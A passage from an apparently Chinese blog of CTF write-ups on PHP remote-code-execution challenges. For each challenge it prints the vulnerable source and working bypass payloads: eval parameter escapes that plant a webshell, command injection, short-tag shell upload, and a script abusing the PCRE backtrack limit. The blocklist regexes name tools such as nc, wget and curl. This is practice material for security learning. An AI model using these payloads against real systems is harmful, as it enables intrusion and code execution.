&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;&#125;%0a%0a</code></p>
<h4 id="BUUCTF在线评测-Begin-of-PHP"><a href="#BUUCTF在线评测-Begin-of-PHP" class="headerlink" title="BUUCTF在线评测 Begin of PHP"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]Begin of PHP">BUUCTF在线评测</a> Begin of PHP</h4><p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123;</span><br><span class="line">    echo &quot;=Level 1=&lt;br&gt;&quot;;</span><br><span class="line">    if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123;</span><br><span class="line">        $flag1 = True;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;nope,this is level 1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if($flag1)&#123;</span><br><span class="line">    echo &quot;=Level 2=&lt;br&gt;&quot;;</span><br><span class="line">    if(isset($_POST[&#x27;key3&#x27;]))&#123;</span><br><span class="line">        if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123;</span><br><span class="line">            $flag2 = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;nope,this is level 2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if($flag2)&#123;</span><br><span class="line">    echo &quot;=Level 3=&lt;br&gt;&quot;;</span><br><span class="line">    if(isset($_GET[&#x27;key4&#x27;]))&#123;</span><br><span class="line">        if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123;</span><br><span class="line">            $flag3 = True;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;nope,this is level 3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if($flag3)&#123;</span><br><span class="line">    echo &quot;=Level 4=&lt;br&gt;&quot;;</span><br><span class="line">    if(isset($_GET[&#x27;key5&#x27;]))&#123;</span><br><span class="line">        if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123;</span><br><span class="line">            $flag4 = True;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;nope,this is level 4&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if($flag4)&#123;</span><br><span class="line">    echo &quot;=Level 5=&lt;br&gt;&quot;;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    foreach($_POST as $var)&#123;</span><br><span class="line">        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;</span><br><span class="line">            die(&quot;nope,this is level 5&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($flag5)&#123;</span><br><span class="line">        echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;nope,this is level 5&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>先看Level1</p>
<p>关于MD5强比较，直接数组绕过即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key1[]=1&amp;key2[]=2</span><br></pre></td></tr></table></figure>
<p>再看Level2</p>
<p>这里的sha1()函数也是无法处理数组，会返回NULL值，因此严格等于左右相等</p>
<p>所以也直接数组绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key3[]=3</span><br></pre></td></tr></table></figure>
<p>看Level4</p>
<p>比较两个字符串，如果字符串１与字符串２相等，则返回０，如果字符串１大于字符串２则返回值大于０，如果字符串１小于字符串２则返回值小于０。但是，strcmp()依然无法操作数组，会返回NULL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key1[]=1&amp;key2[]=2&amp;key4[]=4</span><br></pre></td></tr></table></figure>
<p>看Level5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key5[]=2024</span><br></pre></td></tr></table></figure>
<p>最后：</p>
<p>在这里a-z,A-Z,0-9全被过滤了，就要用非字母和数字的方式将其绕过，用POST方式传递</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag5=.</span><br></pre></td></tr></table></figure>
<h4 id="CMCTF-CM-CTF-函数重生版"><a href="#CMCTF-CM-CTF-函数重生版" class="headerlink" title="CMCTF - CM::CTF 函数重生版"></a><a target="_blank" rel="noopener" href="http://ctf.coldwindy.cn/games/5/challenges">CMCTF - CM::CTF</a> 函数重生版</h4><p>（不当人）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>],<span class="number">0</span>,<span class="number">6</span>)))&#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|flag|zlib|ftp|system|shell_exec|exec|file_get_contents|proc_open|fopen|fgets|file_put_contents|file|fread|readfile|stream_get_contents|cat|more|tac|\:|\]|\[|\+|\-|\*|\eval|\^|\`|\&quot;|\&lt;|\&gt;|\\|\/|\ssh/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里没过滤大括号和单引号，可以采用一个{}来代替[]，然后参数逃逸一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?i=eval($_GET&#123;%27a%27&#125;);&amp;a=assert(eval($_POST[%27x%27]));</span><br></pre></td></tr></table></figure>
<p>可以直接蚁剑连</p>
<h4 id="2025H-amp-NCTF-2025H-amp-N-CTF-Really-Ez-Rce"><a href="#2025H-amp-NCTF-2025H-amp-N-CTF-Really-Ez-Rce" class="headerlink" title="2025H&amp;NCTF - 2025H&amp;N::CTF Really_Ez_Rce"></a><a target="_blank" rel="noopener" href="https://2025hnctf.huhstsec.top/games/2/challenges#10-Really_Ez_Rce">2025H&amp;NCTF - 2025H&amp;N::CTF</a> Really_Ez_Rce</h4><p>（更不当人）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,</span><br><span class="line">                <span class="variable">$cmd</span></span><br><span class="line">            )) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个Number简单，直接给个数组就绕过了，Number[]=a，重点是这个正则</p>
<p>没过滤$，直接参数拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Number[]=a&amp;cmd=b=l;c=s;d=/;$b$c%20$d;</span><br><span class="line"></span><br><span class="line">Number[]=a&amp;cmd=b=bas;c=e64;a=s;c=h;echo%2Y2F0IGZsYWcudHh0|$b$c%20-d|$a$c</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-EasyByPass"><a href="#BUUCTF在线评测-EasyByPass" class="headerlink" title="BUUCTF在线评测 EasyByPass"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#EasyBypass">BUUCTF在线评测</a> EasyByPass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line"><span class="variable">$comm2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$comm1</span>))</span><br><span class="line">    <span class="variable">$comm1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="variable">$comm2</span>))</span><br><span class="line">    <span class="variable">$comm2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm1</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$comm2</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm2</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;file <span class="subst">$comm1</span> <span class="subst">$comm2</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现对于comm1没有过滤<code>&quot;&quot;</code> ，就可以尝试闭合左右两边的双引号，且虽然过滤了flag，却没有过滤 <code>?</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?comm1=index&quot;;tac /fla?;&quot;&amp;comm2=1</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-Write-shell"><a href="#BUUCTF在线评测-Write-shell" class="headerlink" title="BUUCTF在线评测 Write_shell"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[红明谷CTF 2021]write_shell">BUUCTF在线评测</a> Write_shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>php标签的<code>php</code>被过滤，可以换用短标签<code>&lt;?= code?&gt;</code>，<code>?&gt;</code>对于一组PHP代码中最后一句起到替代<code>;</code></p>
<p><strong>payload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt;</span><br></pre></td></tr></table></figure>
<p>因为题目中过滤了php，所以用php短标签来绕过<code>&lt;?= ?&gt;</code>等效于<code>&lt;?echo ?&gt;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>输出访问者的IP地址</p>
<h3 id="回溯限制"><a href="#回溯限制" class="headerlink" title="回溯限制"></a>回溯限制</h3><h4 id="NISACTF-2022-middlerce-NSSCTF"><a href="#NISACTF-2022-middlerce-NSSCTF" class="headerlink" title="[NISACTF 2022]middlerce | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">[NISACTF 2022]middlerce | NSSCTF</a></h4><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>.</code> 匹配<strong>任意一个字符</strong>（除换行符 <code>\n</code> 外，除非启用 <code>s</code> 模式）</li>
<li><code>*</code> 表示<strong>前面的字符（或组）重复 0 次或多次</strong></li>
</ul>
<p>这两个加起来就导致了 <strong>.*</strong> 将会一直匹配到最后字符串的最后，然后轮到下一个字符</p>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit ： <code>1000000</code></p>
<p>当回溯次数超过100万次时，preg_match返回的就是false，表示此次实行失败（超出限制）</p>
<p>所以我们可以通过发送超长字符串来使正则执行失败，绕过对php的限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28058/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;,&quot;+&quot;:&quot;&#x27;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(url=url, data=&#123;<span class="string">&quot;letter&quot;</span>: payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
<h3 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h3><h4 id="利用http标头"><a href="#利用http标头" class="headerlink" title="利用http标头"></a>利用http标头</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]R!!C!!E!!">BUUCTF在线评测</a> R!!C!!E!!</p>
<p>扫目录+<code>python GitHack.py URL</code></p>
<p>看到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以用上文提到的scandir组合拳去做，但是发现没有什么效果，这里就可以用查看请求头的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?star=print_r(getallheaders());</span><br></pre></td></tr></table></figure>
<p>然后选择命令加在UA上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?star=eval(next(getallheaders()));</span><br></pre></td></tr></table></figure>
<h4 id="只允许用特殊字符"><a href="#只允许用特殊字符" class="headerlink" title="只允许用特殊字符"></a>只允许用特殊字符</h4><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/909">[安洵杯 2020]BASH | NSSCTF</a></p>
<p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title 